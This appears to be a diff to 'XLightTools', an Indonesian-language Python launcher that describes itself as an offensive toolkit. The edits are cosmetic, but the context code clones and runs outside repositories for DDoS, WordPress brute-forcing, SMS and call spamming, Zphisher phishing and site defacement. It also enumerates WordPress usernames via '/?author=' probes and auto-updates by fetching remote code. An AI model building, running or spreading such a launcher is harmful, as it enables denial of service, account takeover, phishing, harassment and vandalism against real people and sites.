@@ -16,12 +16,12 @@ RESET = "\033[0m"
 
 # ASCII Logo
 ascii_logo = f"""
-{R}██╗  ██╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     
-██║ ██╔╝██║     ██║██╔═══██╗██║ ██╔╝╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     
-█████╔╝ ██║     ██║██║   ██║█████╔╝    ██║      ██║   ██║   ██║██║   ██║██║     
-██╔═██╗ ██║     ██║██║   ██║██╔═██╗    ██║      ██║   ██║   ██║██║   ██║██║     
-██║  ██╗███████╗██║╚██████╔╝██║  ██╗   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
-╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+{R}██╗     █████╗ ███╗   ██╗ ██████╗ ██╗████████╗███████╗██████╗ ███████╗██╗   ██╗
+██║    ██╔══██╗████╗  ██║██╔════╝ ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝
+██║    ███████║██╔██╗ ██║██║  ███╗██║   ██║   █████╗  ██████╔╝█████╗   ╚████╔╝ 
+██║    ██╔══██║██║╚██╗██║██║   ██║██║   ██║   ██╔══╝  ██╔══██╗██╔══╝    ╚██╔╝  
+███████╗██║  ██║██║ ╚████║╚██████╔╝██║   ██║   ███████╗██║  ██║███████╗   ██║   
+╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 {RESET}         {C}:: XLightTools Ultimate by LangitDev ::
 """
 
@@ -34,7 +34,8 @@ def banner():
     time.sleep(1)
     print(f"{C}XLightTools adalah toolkit multi-fungsi untuk kebutuhan offensive.{RESET}")
     time.sleep(1)
-    print(f"{G}Versi: XLight Final Build 1.0{RESET}\n")
+    print(f"{G}Versi: XLight Final Build 1.1 with FX Mode{RESET}\n")
+    time.sleep(1)
 
 def menu():
     print(f"{Y}[01] LiteDDOS")
@@ -45,13 +46,24 @@ def menu():
     print("[06] Auto Update")
     print("[00] Keluar{RESET}")
 
+# FX effect (terminal visual blinking)
+def fx(message):
+    for i in range(3):
+        print(f"{G}{message}{RESET}", end="\r")
+        time.sleep(0.2)
+        print(" " * len(message), end="\r")
+        time.sleep(0.2)
+    print(f"{G}{message}{RESET}")
+
 def lite_ddos():
+    fx("[•] Menjalankan LiteDDOS...")
     os.system("pkg install git python2 -y")
     os.system("git clone https://github.com/4L13199/LITEDDOS")
     os.chdir("LITEDDOS")
     os.system("python2 liteDDOS.py")
 
 def wp_brute():
+    fx("[•] Menjalankan WPBrute...")
     os.system("pkg install git python3 -y")
     if not os.path.exists("WPBrute-LangitDev"):
         os.system("git clone https://github.com/lanjelot/wpbf")
@@ -60,12 +72,14 @@ def wp_brute():
     os.system("python3 wpbf.py")
 
 def spam_call_sms():
+    fx("[•] Menjalankan Spam SMS/Call...")
     os.system("pkg install git php -y")
     os.system("git clone https://github.com/4L13199/LITESPAM")
     os.chdir("LITESPAM")
     os.system("sh LITESPAM.sh")
 
 def phishing_tool():
+    fx("[•] Menjalankan Zphisher...")
     os.system("pkg install git curl -y")
     if not os.path.exists("zphisher"):
         os.system("git clone https://github.com/htr-tech/zphisher")
@@ -73,6 +87,7 @@ def phishing_tool():
     os.system("bash zphisher.sh")
 
 def deface_creator():
+    fx("[•] Menjalankan Script Deface Creator...")
     os.system("pkg install git python2 -y")
     if not os.path.exists("script-deface-creator"):
         os.system("git clone https://github.com/Ubaii/script-deface-creator")
@@ -80,7 +95,7 @@ def deface_creator():
     os.system("python2 create.py")
 
 def auto_update():
-    print(f"{C}[•] Mengecek update terbaru...{RESET}")
+    fx("[•] Mengecek update terbaru...")
     repo_url = "https://raw.githubusercontent.com/langitdev/ultimate-tools/main/xlighttools.py"
     try:
         req = requests.get(repo_url)
@@ -110,7 +125,7 @@ def get_usernames(target_url):
             print(f"{R}[!] Error parsing JSON: {e}{RESET}")
     else:
         print(f"{Y}[!] API tidak aktif, mencoba metode lain...{RESET}")
-        for i in range(1, 11):  
+        for i in range(1, 11):
             url = f"{target_url}/?author={i}"
             response = requests.get(url, allow_redirects=True)
             if response.status_code == 200:
